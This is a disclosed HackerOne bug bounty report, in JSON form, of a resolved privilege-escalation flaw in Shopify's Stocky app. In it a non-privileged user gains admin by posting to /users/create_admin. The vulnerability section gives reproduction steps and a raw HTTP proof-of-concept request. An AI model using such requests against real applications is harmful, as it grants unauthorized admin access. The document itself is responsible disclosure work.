{
  "id": 1245736,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjQ1NzM2",
  "url": "https://hackerone.com/reports/1245736",
  "title": "A non-privileged user may create an admin account in Stocky",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2021-06-27T14:57:45.916Z",
  "submitted_at": "2021-06-27T14:57:46.064Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "stapia",
    "url": "/stapia",
    "profile_picture_urls": {
      "small": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTUzNzg1NCwicHVyIjoiYmxvYl9pZCJ9fQ==--d7551422639bfbe8e27e0d58e5738f01382a44be/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJncmF2aXR5IjoiQ2VudGVyIiwicmVzaXplIjoiNjJ4NjJeIiwiY3JvcCI6IjYyeDYyKzArMCJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--2de8067d228529d65848a4eeed0bed0bb2531bc3/IMG_3995.jpg"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-25T20:43:16.403Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-25T20:43:16.302Z",
  "team_member_agreed_on_going_public_at": "2021-11-25T19:42:18.591Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "##Summary:\nA non-privileged Stocky user (created within Stocky)  may be able to create a new admin user.\n\n##Steps to reproduce:\n1.Create a non-privileged user in Stocky, don't give admin privileges to that user.\n2.Login with the non-privileged user and go to https://stocky.shopifyapps.com/users/me, update any field and intercept the request.\n3. Make a POST request to /users/create_admin with the Cookies and Token that you intercepted from the previous steps.\n4. Log out from Stocky and Login with the new user, you will have admin privileges.\n\n```\nPOST /users/create_admin HTTP/2\nHost: stocky.shopifyapps.com\nCookie:[REPLACE COOKIES]\nContent-Length: 277\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nUpgrade-Insecure-Requests: 1\nOrigin: https://stocky.shopifyapps.com\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://stocky.shopifyapps.com/preferences/users\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\nutf8=%E2%9C%93&authenticity_token=[REPLACE TOKEN]&user%5Bfirst_name%5D=██████&user%5Blast_name%5D=████████&user%5Bemail%5D=██████████&commit=Create+%26+Login\n```\n\n## Impact\n\nA non-privileged Stocky user may get full admin privileges within the app, which would allow that user to update the inventory, stock, vendors, place purchase orders, etc, even if that user doesn't have those privileges within Shopify.",
  "bounty_amount": "1600.0",
  "formatted_bounty": "$1,600",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 64,
  "voters": [
    "loaymorad",
    "raindeaf",
    "m7arm4n",
    "p0ch4t",
    "idron",
    "drsniper",
    "shreyaschavhan",
    "7odamoo",
    "ali",
    "polem4rch",
    "and 54 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.2,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 37198,
    "asset_type": "OTHER",
    "asset_identifier": "Shopify Developed Apps",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 111286,
      "category": "team",
      "content": "@stapia reported that it was possible to create a new user by posting directly to the `/users/create_admin` endpoint in Stocky. This bypassed the Stocky user login screen entirely, for a staff member with Apps permission.\n\nNote that certain types of issues in Stocky are not currently being accepted on our program, so please remember to review the program page before digging into this app.",
      "updated_at": "2021-11-26T16:24:35.282Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 75410,
        "username": "jenn-shopify",
        "name": "jenn",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2016-05-09T18:26:09.949Z",
        "url": "https://hackerone.com/jenn-shopify",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
